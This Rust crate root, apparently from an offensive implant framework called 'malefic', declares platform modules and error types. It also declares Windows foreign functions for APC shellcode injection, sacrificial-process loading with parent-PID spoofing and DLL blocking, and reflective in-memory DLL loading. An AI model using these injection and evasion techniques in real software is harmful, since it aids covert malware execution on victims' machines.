
#[cfg(target_os = "windows")]
pub mod win;

pub mod common;

pub mod protobuf;

#[cfg(target_os = "macos")]
pub mod darwin;

#[cfg(target_os = "linux")]
pub mod linux;

#[cfg(target_family = "unix")]
pub mod unix;


#[cfg(test)]
#[macro_use]
extern crate std;

use thiserror::Error;

#[derive(Error, Debug)]
pub enum CommonError {
    #[cfg(target_os = "windows")]
    #[error(transparent)]
    WinApiError(#[from] windows::core::Error),

    #[error(transparent)]
    NetstatError(#[from] netstat2::error::Error),

    #[error("{0}")]
    Win32Error(u32),

    #[error("")]
    AllocationFailed,

    #[error(transparent)]
    UnixError(#[from] std::io::Error),

    #[error("")]
    FreeFailed,

    #[error("")]
    NotImpl,

    #[error("{0}")]
    ArgsError(String),
}


#[macro_export]
macro_rules! debug {
    ($($arg:tt)*) => {
        if cfg!(debug_assertions) {
            println!($($arg)*);
        }
    };
}

#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
#[link(name="malefic_win_kit", kind="static")]
extern "C" {
    fn ApcLoaderInline(bin: *const u8,bin_len: usize) -> *const u8;
    fn ApcLoaderSacriface(bin: *const u8,bin_len: usize, sacrifice_commandline: *mut i8, ppid: u32, block_dll: bool) -> *const u8;
    fn MaleficExitThread(code: i32);
    fn MaleficLoadLibrary(flags: u32, buffer: winapi::shared::ntdef::LPCWSTR,
        file_buffer: *const core::ffi::c_void,
        len: usize,
        name: *const u8,) -> *const core::ffi::c_void;
    fn MaleficGetFuncAddrWithModuleBaseDefault(
        module_base: *const core::ffi::c_void,
        func_name: *const u8,
        func_name_len: usize
    ) -> *const core::ffi::c_void;
}

#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
struct DarkModule {
    module_base: *const core::ffi::c_void,
    is_successed: bool,
}

#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
pub const LOAD_MEMORY: u16 = 0x02u16;
#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
pub const AUTO_RUN_DLL_MAIN: u32 = 0x00010000u32;